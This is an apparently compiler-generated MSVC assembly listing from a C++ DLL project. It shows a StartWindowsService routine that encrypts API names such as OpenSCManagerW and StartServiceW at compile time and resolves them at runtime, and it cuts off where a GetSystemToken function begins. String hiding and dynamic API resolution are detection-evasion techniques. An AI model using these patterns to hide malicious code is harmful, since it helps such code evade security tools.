	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN26@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ ENDP ; `ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ PROC ; `ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator(), COMDAT

; 248  : 	PPROCFN::_OpenSCManagerW       pOpenSCManager = GetFunctionAddress<PPROCFN::_OpenSCManagerW>(advapi, std::string(HIDE("OpenSCManagerW")));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4V67@A
	test	al, 1
	jne	SHORT $LN28@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	DWORD PTR [rbx+12], 32761373		; 01f3e61dH
	mov	DWORD PTR [rbx], 1666728818		; 63584372H
	mov	DWORD PTR [rbx+4], 1623126588		; 60bef23cH
	mov	DWORD PTR [rbx+8], 1750749779		; 685a5253H
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 248  : 	PPROCFN::_OpenSCManagerW       pOpenSCManager = GetFunctionAddress<PPROCFN::_OpenSCManagerW>(advapi, std::string(HIDE("OpenSCManagerW")));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN28@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ ENDP ; `ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ
_TEXT	SEGMENT
obfuscator$ = 32
this$dead$ = 80
??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ PROC ; `ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator(), COMDAT

; 249  : 	PPROCFN::_QueryServiceStatusEx pQueryServiceStatus = GetFunctionAddress<PPROCFN::_QueryServiceStatusEx>(advapi, std::string(HIDE("QueryServiceStatusEx")));

	push	rbx
	sub	rsp, 64					; 00000040H
	movdqa	xmm0, XMMWORD PTR __xmm@23f641f88890a04725f266d29f96bc60
	mov	DWORD PTR obfuscator$[rsp+16], -1783186876 ; 95b6ba44H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4V67@A
	test	al, 1
	jne	SHORT $LN17@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [r8+rdx]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 177  : 		bool m_encrypted{ true };

	mov	BYTE PTR [rbx+21], 1
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 249  : 	PPROCFN::_QueryServiceStatusEx pQueryServiceStatus = GetFunctionAddress<PPROCFN::_QueryServiceStatusEx>(advapi, std::string(HIDE("QueryServiceStatusEx")));

	lea	rax, QWORD PTR [rbx+20]
	lea	rcx, QWORD PTR obfuscator$[rsp+20]
	cmp	rbx, rcx
	ja	SHORT $LN14@operator
	lea	rcx, QWORD PTR obfuscator$[rsp]
	cmp	rax, rcx
	jb	SHORT $LN14@operator
	movups	XMMWORD PTR [rbx], xmm0
	mov	eax, DWORD PTR obfuscator$[rsp+16]
	mov	DWORD PTR [rbx+16], eax
	mov	BYTE PTR [rbx+20], 171			; 000000abH
	jmp	SHORT $LN20@operator
$LN14@operator:
	movups	XMMWORD PTR [rbx], xmm0
	mov	ecx, DWORD PTR obfuscator$[rsp+16]
	mov	DWORD PTR [rbx+16], ecx
	mov	BYTE PTR [rbx+20], 171			; 000000abH
$LN20@operator:
	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
$LN17@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 64					; 00000040H
	pop	rbx
	ret	0
??R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ ENDP ; `ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
obfuscator$ = 32
this$dead$ = 80
?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ PROC ; `ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator(), COMDAT

; 250  : 	PPROCFN::_StartService         pStartService = GetFunctionAddress<PPROCFN::_StartService>(advapi, std::string(HIDE("StartServiceW")));

	push	rbx
	sub	rsp, 32					; 00000020H
	mov	ecx, DWORD PTR _tls_index
	mov	rax, QWORD PTR gs:88
	mov	rdx, QWORD PTR [rax+rcx*8]
	mov	ecx, OFFSET FLAT:??__J?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@51
	mov	eax, DWORD PTR [rcx+rdx]
	mov	r8d, OFFSET FLAT:?obfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4V67@A
	test	al, 1
	jne	SHORT $LN27@operator
	or	eax, 1
	mov	DWORD PTR [rcx+rdx], eax
	lea	rbx, QWORD PTR [rdx+r8]
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h

; 123  : 				m_data[i] = obfuscator.data()[i];

	mov	WORD PTR [rbx+13], 445			; 000001bdH
	mov	DWORD PTR [rbx], 1807903502		; 6bc26b0eH
	mov	DWORD PTR [rbx+4], 1762717285		; 6910ee65H
	mov	DWORD PTR [rbx+8], 2092987947		; 7cc0762bH
	mov	BYTE PTR [rbx+12], 70			; 00000046H
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 250  : 	PPROCFN::_StartService         pStartService = GetFunctionAddress<PPROCFN::_StartService>(advapi, std::string(HIDE("StartServiceW")));

	lea	rcx, OFFSET FLAT:??__Fobfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
	call	__tlregdtor
	npad	1
	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN27@operator:
	lea	rax, QWORD PTR [rdx+r8]
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ ENDP ; `ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
this$dead$ = 48
?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA PROC ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()'::`1'::dtor$0
	push	rbp
	mov	rbp, rdx
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@51
	mov	ecx, eax
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	r8, QWORD PTR gs:88
	add	r8, rax
	mov	r8, QWORD PTR [r8]
	add	r8, rcx
	mov	r8d, DWORD PTR [r8]
	and	r8d, -2					; fffffffeH
	mov	eax, DWORD PTR _tls_index
	imul	rax, rax, 8
	mov	rdx, QWORD PTR gs:88
	add	rdx, rax
	mov	eax, OFFSET FLAT:??__J?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@51
	mov	ecx, eax
	mov	rax, QWORD PTR [rdx]
	add	rax, rcx
	mov	DWORD PTR [rax], r8d
	pop	rbp
	ret	0
?dtor$0@?0???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4HA ENDP ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@4V67@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	mov	WORD PTR [rdx+12], ax
	ret	0
??__Fobfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	xorps	xmm0, xmm0
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@4V67@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	movups	XMMWORD PTR [rdx], xmm0
	mov	DWORD PTR [rdx+16], eax
	mov	BYTE PTR [rdx+20], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@4V67@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	mov	WORD PTR [rdx+12], ax
	mov	BYTE PTR [rdx+14], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
;	COMDAT ??__Fobfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@YAXXZ
text$yd	SEGMENT
??__Fobfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@YAXXZ PROC ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data'', COMDAT
	mov	rax, QWORD PTR gs:88
	mov	ecx, DWORD PTR _tls_index
	mov	edx, OFFSET FLAT:?obfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@4V67@A
	add	rdx, QWORD PTR [rax+rcx*8]

; 130  : 			for ( size_type i = 0; i < N; i++ )

	xor	eax, eax
	mov	QWORD PTR [rdx], rax
	mov	DWORD PTR [rdx+8], eax
	mov	BYTE PTR [rdx+12], al
	ret	0
??__Fobfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@YAXXZ ENDP ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Users\ethan\source\repos\DLL\DLL\Headers\obfuscate.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ??R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ
_TEXT	SEGMENT
this$dead$ = 48
